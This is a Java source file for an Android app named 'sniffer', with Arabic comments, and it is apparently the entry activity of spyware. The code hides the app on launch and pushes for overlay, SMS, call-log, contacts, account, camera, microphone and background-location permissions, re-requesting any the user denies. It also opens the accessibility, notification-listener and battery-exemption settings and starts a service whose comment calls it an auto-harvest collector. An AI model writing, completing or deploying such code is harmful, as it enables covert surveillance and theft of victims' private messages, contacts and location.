package com.v8.global.sniffer;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 101;
    private boolean permissionsRequested = false;
    private int permissionRetryCount = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إخفاء التطبيق فوراً
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        }
        
        // بدء عملية الصلاحيات بعد ثانية
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                startPermissionProcess();
            }
        }, 1000);
    }
    
    private void startPermissionProcess() {
        // أولاً: طلب صلاحية SYSTEM_ALERT_WINDOW (مهم جداً)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }
        
        // ثانياً: طلب باقي الصلاحيات
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        // قائمة جميع الصلاحيات المطلوبة
        String[] permissions = {
            Manifest.permission.INTERNET,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.POST_NOTIFICATIONS
        };
        
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty() && !permissionsRequested) {
            permissionsRequested = true;
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات ممنوحة
            setupComplete();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // التحقق من الصلاحيات المرفوضة
            List<String> deniedPermissions = new ArrayList<>();
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissions.add(permissions[i]);
                }
            }
            
            if (!deniedPermissions.isEmpty() && permissionRetryCount < 3) {
                // إعادة طلب الصلاحيات المرفوضة
                permissionRetryCount++;
                ActivityCompat.requestPermissions(this, 
                    deniedPermissions.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            } else {
                // بعد 3 محاولات أو نجاح كل الصلاحيات
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        setupComplete();
                    }
                }, 2000);
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == SYSTEM_ALERT_WINDOW_CODE) {
            // بعد صلاحية النوافذ العائمة، نكمل باقي الصلاحيات
            requestAllPermissions();
        }
    }
    
    private void setupComplete() {
        // طلب تجاهل تحسين البطارية
        requestIgnoreBatteryOptimizations();
        
        // فتح إعدادات الإشعارات
        openNotificationSettings();
        
        // فتح إعدادات الوصول
        openAccessibilitySettings();
        
        // تشغيل الخدمات
        startServices();
        
        // إنهاء النشاط
        finish();
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        }
    }
    
    private void openNotificationSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
    
    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void startServices() {
        // تشغيل خدمة الإشعارات
        Intent notificationIntent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(notificationIntent);
        } else {
            startService(notificationIntent);
        }
        
        // تشغيل خدمة السحب التلقائي
        Intent collectorIntent = new Intent(this, AutoCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(collectorIntent);
        } else {
            startService(collectorIntent);
        }
        
        // تشغيل حارس الصلاحيات
        Intent guardianIntent = new Intent(this, PermissionGuardian.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(guardianIntent);
        } else {
            startService(guardianIntent);
        }
        
        // تشغيل مساعد الصلاحيات
        AutoPermissionHelper.startPermissionHelper(this);
    }
}
